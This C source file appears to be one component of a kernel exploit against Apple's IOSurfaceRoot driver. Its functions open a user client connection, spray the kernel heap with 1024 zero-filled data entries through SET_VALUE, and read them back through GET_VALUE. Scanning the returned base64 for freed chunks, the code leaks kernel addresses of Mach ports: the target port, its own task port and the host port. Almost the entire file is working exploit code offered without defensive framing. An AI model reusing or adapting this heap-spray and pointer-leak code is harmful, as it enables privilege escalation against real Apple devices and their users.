#include "iosurface.h"

char* createXML();

io_connect_t openIOSurfaceConnection() {
    kern_return_t err;

	CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
	if (!matching) {
		printf("Unable to create service matching dictionary\n");
		return MACH_PORT_NULL;
	}

	io_iterator_t iterator;
	err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);

	if (err != KERN_SUCCESS) {
		printf("no matches\n");
		return MACH_PORT_NULL;
	}

	io_service_t service = IOIteratorNext(iterator);

	if (service == IO_OBJECT_NULL) {
		printf("unable to find service\n");
		return MACH_PORT_NULL;
	}
	printf("got service: %x\n", service);

	io_connect_t conn = MACH_PORT_NULL;
	err = IOServiceOpen(service, mach_task_self(), 0, &conn);
	if (err != KERN_SUCCESS) {
		printf("unable to get user client connection\n");
		return MACH_PORT_NULL;
	}
	printf("got user client connection: %x\n", conn);
	return conn;
}

uint32_t createSurface(io_connect_t conn) {
    kern_return_t err;

	char* input_string = "<dict><key>IOSurfaceAllocSize</key><integer>32</integer></dict>";
	create_surface_output_t output_struct;
	size_t output_size = sizeof(output_struct);
	err = IOConnectCallStructMethod(conn, CREATE_SURFACE,
				    input_string, strlen(input_string) + 1,
				    &output_struct, &output_size);

	if (err != KERN_SUCCESS) {
		printf("Create Surface Failed: %x\n", err);
		return 0;
	} else {
		// printf("Successfully Created Surface\n");
	}

	// testing
	// printf("1- %x\n", ((uint32_t*)(output_struct._padding))[0]);
	// printf("2- %x\n", ((uint16_t*)(output_struct._padding))[0]);
	// return ((uint32_t*)(output_struct._padding))[0];

    return output_struct.data.id;
}

int setValueSpray(io_connect_t conn, uint32_t surface_id) {
    kern_return_t err;
	char* input_string;
	uint8_t* input_struct;

	input_string = createXML();
	size_t input_string_size = strlen(input_string);
	size_t input_struct_size = sizeof(uint32_t) + input_string_size + 1;
	input_struct = malloc(input_struct_size);
	
    memcpy(input_struct, &surface_id, sizeof(uint32_t));
    memcpy(input_struct+sizeof(uint32_t), input_string, input_string_size+1);

	err = IOConnectCallStructMethod(conn, SET_VALUE,
				    input_struct, input_struct_size,
				    NULL, NULL);

	if (err != KERN_SUCCESS) {
		printf("Set Value Failed: %x\n", err);
		return 1;
	} else {
		// printf("Successfully Set Value\n");
	}

	free(input_string);
	free(input_struct);

    return 0;
}

#define GET_VALUE_OUTPUT 0x15000

int getValue(io_connect_t conn, uint32_t surface_id) {
    kern_return_t err;
	uint8_t* input_struct;
	size_t input_size, output_size;
	char output_buf[GET_VALUE_OUTPUT];
	char b64_encoded_buf[41]; // size of data eg 4KIeke++rd7vvq3e776t3u++rd7vvq3e776t3g==

	mach_port_t target_port_kp = 0;
	mach_port_t own_task_port_kp = 0;
	mach_port_t mach_host_self_kp = 0;

    input_size = sizeof(uint32_t) + sizeof(uint64_t);
    input_struct = calloc(input_size, sizeof(char));

    *(uint32_t *)input_struct = surface_id;
    *((uint64_t *)input_struct + sizeof(uint32_t)) = 0x0000007961727073; // ASCII "spray"

	output_size = GET_VALUE_OUTPUT;

	err = IOConnectCallStructMethod(conn, GET_VALUE,
				    input_struct, input_size,
				    output_buf, &output_size);

	if (err != KERN_SUCCESS) {
		printf("Set Value Failed: %x\n", err);
		return 1;
	}
	free(input_struct);

	bzero(b64_encoded_buf, 41);
	char* str_ptr = output_buf + 43; // skips initial "<dict ID="0"><key>spray</key><array ID="1">"
	while ((str_ptr = strstr(str_ptr, "\">"))) {
		str_ptr += 2; // skip the ">
		memcpy(b64_encoded_buf, str_ptr, 40);
		if (strncmp(b64_encoded_buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==", 40)) { // found one that does not match
			printf("found freed chunk: [%s]\n", b64_encoded_buf);
			size_t size;
			uint8_t* decoded = b64ToBytes(b64_encoded_buf, &size);
			for (int i = 0; i < size / sizeof(int); i++) {
				printf("found freed chunk (decoded as int): [0x%x]\n", ((int*)decoded)[i]);
				if ( ((mach_port_t*)decoded)[i] ) {
					if (!target_port_kp)
						target_port_kp = ((mach_port_t*)decoded)[i];
					else if (!own_task_port_kp)
						own_task_port_kp = ((mach_port_t*)decoded)[i];
					else if (!mach_host_self_kp)
						mach_host_self_kp = ((mach_port_t*)decoded)[i];
					else {
						printf("Too much data\n");
						return 1;
					}
				}
			}
		}
		// printf("[%s]\n", b64_encoded_buf);
	}

	if (target_port_kp && own_task_port_kp && mach_host_self_kp) {
		printf("leaked target_port_kp: 0x%x own_task_port_kp: 0x%x mach_host_self_kp: 0x%x\n", target_port_kp, own_task_port_kp, mach_host_self_kp);
	} else {
		printf("Failed to leak kernel pointers of mach ports\n");
		return 1;
	}

    return 0;
}

char* createXML() {
	char* start_str = "<array><array>";
	char* end_str = "</array><string>spray</string></array>";

	uint8_t* zeroes = calloc(XML_DATA_SIZE, sizeof(uint8_t));
	char* zeroes_b64_str = bytesToB64(zeroes, XML_DATA_SIZE);
	free(zeroes);
	char* data_str = calloc(strlen("<data></data>") + strlen(zeroes_b64_str) + 1, sizeof(char));
	memcpy(data_str, "<data>", strlen("<data>"));
	memcpy(data_str+strlen("<data>"), zeroes_b64_str, strlen(zeroes_b64_str));
	memcpy(data_str+strlen("<data>")+strlen(zeroes_b64_str), "</data>", strlen("</data>"));
	free(zeroes_b64_str);

	size_t start_size = strlen(start_str);
	size_t data_size = strlen(data_str);
	size_t data_size_total = data_size * 1024;
	size_t end_size = strlen(end_str);
	size_t xml_size = start_size + data_size_total + end_size;

	char* xml_str = calloc(xml_size + 1, sizeof(char));
	memcpy(xml_str, start_str, start_size);
	for (int i = 0; i < 1024; i++) {
		memcpy(xml_str+start_size+(i*data_size), data_str, data_size);
	}
	memcpy(xml_str+start_size+data_size_total, end_str, end_size);
	return xml_str;
}
